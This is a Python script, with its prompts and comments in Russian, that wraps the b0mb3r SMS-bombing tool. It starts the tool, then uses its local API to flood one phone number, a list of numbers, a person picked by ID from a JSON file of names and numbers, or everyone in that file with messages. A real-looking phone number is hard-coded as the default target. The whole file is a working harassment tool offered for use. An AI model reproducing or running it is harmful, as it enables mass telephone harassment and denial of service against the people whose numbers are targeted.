import requests
from subprocess import Popen
import time
import json
import codecs

print("скрипт написан etidart'ом")
print("\n\nинициализация b0mb3r'a")
bomb = Popen('b0mb3r', shell=False, stdout=open('stdout.txt', 'wb'), stderr=open('stderr.txt', 'wb'))  # инициализация b0mb3r'а
time.sleep(15)  # задержка на вс
print("b0mb3r инициализирован")  # оповещение об окончании

MODE = 1  # 1 – single phone; 2 multiple phones; 3 attack on id; 4 attack all ids
NUMBER_OF_CYCLES = '1'  # 1 cycle ~ 25 messages
PHONE = '79631704420'  # phone number or numbers if selected 2 mode
PHONES = []
number_of_phones = None
file = codecs.open("js/input.json", "r", "utf_8_sig")
file_data = json.load(file)
file_m = codecs.open("js/massa.json", "r", "utf_8_sig")
file_m_data = json.load(file_m)
massa = int(file_m_data["massa"])  # количество номеров телефонов
id_user = None  # временная переменная


def select_mode():  # функция которая задаёт режим
    global MODE
    mode_select = input("Введите номер режима или HELP для помощи:")
    if str(mode_select) == "HELP":
        print("1 – один номер;\n2 – несколько номеров;\n3 и 1 – атака по ID;\n4 и 2 – атака всех ID")
        select_mode()
    else:
        try:
            mode_select = int(mode_select)
        except:
            print("Неверный ввод. Вы уверены, что ввели номер или HELP?")
            select_mode()
        if int(mode_select) == 1:
            MODE = 1
        elif int(mode_select) == 2:
            MODE = 2
        elif int(mode_select) == 3:  # атака по id
            def hack_me():
                global MODE
                hack_all = input("Вы хотите атаковать по ID?")
                try:
                    hack_all = int(hack_all)
                except:
                    print("Неверный ввод. Вы уверены, что ввели число?")
                    hack_me()
                if str(hack_all) == '1':
                    MODE = 3
                elif str(hack_all) == '2':
                    MODE = 4
                else:
                    print("Неверный ввод. Вы уверены, что ввели цифру 1 или 2?")
                    hack_me()
            hack_me()
        else:
            print("Неверный ввод. Вы уверены, что ввели цифру 1, 2 или 3?")
            select_mode()


def select_cycles():
    global NUMBER_OF_CYCLES
    cycles_select = input("Введите количество циклов или HELP для помощи:")
    if str(cycles_select) == "HELP":
        print("1 цикл – 25 сообщений;\nмаксимум = 255 циклов")
        select_cycles()
    else:
        try:
            cycles_select = int(cycles_select)
        except:
            print("Неверный Ввод. Вы уверены, что ввели номер или HELP?")
            select_cycles()
        if int(cycles_select) >= 1 and int(cycles_select) <= 255:
            NUMBER_OF_CYCLES = int(cycles_select)
        else:
            print("Неверный Ввод. Вы уверены, что ввели число от 1 до 255?")
            select_cycles()


def phone_check():
    global MODE
    global PHONE
    global PHONES
    global number_of_phones
    if MODE == 1:
        phone_select = input("Введите номер телефона без 7 или 8:")
        number_of_digits = 0
        for digit in phone_select:
            number_of_digits += 1
        if number_of_digits == 10:
            pass
        else:
            print("Вы ввели меньше или больше цифр или букв")
            phone_check()
        try:
            phone_select = int(phone_select)
        except:
            print("Неверный Ввод. Вы уверены, что ввели число?")
            phone_check()
        PHONE = '7' + str(phone_select)
    elif MODE == 2:
        number_of_phones = input("Введите количество телефонных номеров (не более 50):")
        try:
            number_of_phones = int(number_of_phones)
        except:
            print("Неверный Ввод. Вы уверены, что ввели число?")
            phone_check()
        if 1 <= int(number_of_phones) <= 50:
            global PHONES
            for i in range(int(number_of_phones)):
                please = True
                while please:
                    temp_phones = input("Введите номер телефона " + str(i + 1) + " без 7 или 8:")
                    number_of_digits_two = 0
                    for digit_two in temp_phones:
                        number_of_digits_two += 1
                    if number_of_digits_two == 10:
                        pass
                    else:
                        print("Вы ввели меньше или больше цифр или букв")
                        continue
                    try:
                        temp_phones = int(temp_phones)
                    except:
                        print("Неверный Ввод. Вы уверены, что ввели число?")
                        continue
                    PHONES.append('7' + str(temp_phones))
                    please = False
                    break
        else:
            print("Неверный Ввод. Вы уверены, что ввели число от 1 до 50?")
    elif MODE == 3:
        global id_user
        id_user = input("Введите ID:")
        try:
            id_user = int(id_user)
        except:
            print("Неверный Ввод. Вы уверены, что ввели число?")
            phone_check()
        if int(id_user) >= 1 and int(id_user) <= massa:
            print("ID: " + str(file_data[int(id_user) - 1]["id"]) + '\nИМЯ: ' + file_data[int(id_user) - 1]["name"] + '\nТЕЛЕФОН: +' + file_data[int(id_user) - 1]["number"])
            het = input("Вы хотите продолжить?")
            if het == "YES":
                PHONE = file_data[int(id_user) - 1]["number"]
            elif het == "NO":
                # bomb.terminate()
                file_m.close()
                file.close()
                quit()
            else:
                print("ОШИБКА")
                phone_check()
        else:
            print("Неверный Ввод. Вы уверены, что ввели число от 1 до " + str(massa) + "?")
            phone_check()
    else:
        het = input("Вы хотите продолжить?")
        if het == "YES":
            for iter in range(massa):
                PHONES.append(file_data[iter]["number"])
        elif het == "NO":
            # bomb.terminate()
            file_m.close()
            file.close()
            quit()
        else:
            print("ОШИБКА")
            phone_check()


select_mode()
select_cycles()
phone_check()

# print(MODE)
# print(NUMBER_OF_CYCLES)
# if MODE == 2:
#     for s in range(int(number_of_phones)):
#         print(PHONES[s])
# elif MODE == 4:
#     for s in range(massa):
#         print(PHONES[s])
# else:
#     print(PHONE)

if MODE == 1:
    response = requests.post(
        "http://127.0.0.1:8080/attack/start",
        json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONE},
    ).json()

    if response["success"]:
        print("АТАКА НАЧАТА")
        id = response["id"]
        response_two = requests.get(
            "http://127.0.0.1:8080/attack/" + id + "/status"
        ).json()
    else:
        print("ОШИБКА")

    if response_two:
        for eter in range(response_two['end_at']):
            response_three = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            print(f"{response_three['currently_at']}/{response_three['end_at']}")
        print("АТАКА ЗАКОНЧЕНА")
elif MODE == 3:
    print("Попытка атаковать   " + file_data[int(id_user) - 1]["name"] + "   ...")
    response = requests.post(
        "http://127.0.0.1:8080/attack/start",
        json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONE},
    ).json()

    if response["success"]:
        print("АТАКА НАЧАТА")
        id = response["id"]
        response_two = requests.get(
            "http://127.0.0.1:8080/attack/" + id + "/status"
        ).json()
    else:
        print("ОШИБКА")

    if response_two:
        for eter in range(response_two['end_at']):
            response_three = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            print(f"{response_three['currently_at']}/{response_three['end_at']}")
        print("АТАКА ЗАКОНЧЕНА")
elif MODE == 4:
    for e in range(massa):
        response = requests.post(
            "http://127.0.0.1:8080/attack/start",
            json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONES[e]},
        ).json()

        if response["success"]:
            id = response["id"]
            response_two = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            if response_two['currently_at'] == response_two['end_at']:
                print("АТАКА ЗАКОНЧЕНА   " + str(e + 1))
            print("АТАКА НАЧАТА   " + str(e + 1))
        else:
            print("ОШИБКА " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
else:
    for e in range(int(number_of_phones)):
        response = requests.post(
            "http://127.0.0.1:8080/attack/start",
            json={"number_of_cycles": NUMBER_OF_CYCLES, "phone": PHONES[e]},
        ).json()

        if response["success"]:
            id = response["id"]
            response_two = requests.get(
                "http://127.0.0.1:8080/attack/" + id + "/status"
            ).json()
            if response_two['currently_at'] == response_two['end_at']:
                print("АТАКА ЗАКОНЧЕНА   " + str(e + 1))
            print("АТАКА НАЧАТА   " + str(e + 1))
        else:
            print("ОШИБКА " + str(e + 1))  # если обнаружена проблема — написать об это и написать номер
# bomb.terminate()
file.close()
file_m.close()
print("\n\n\nСпасибо за использование!")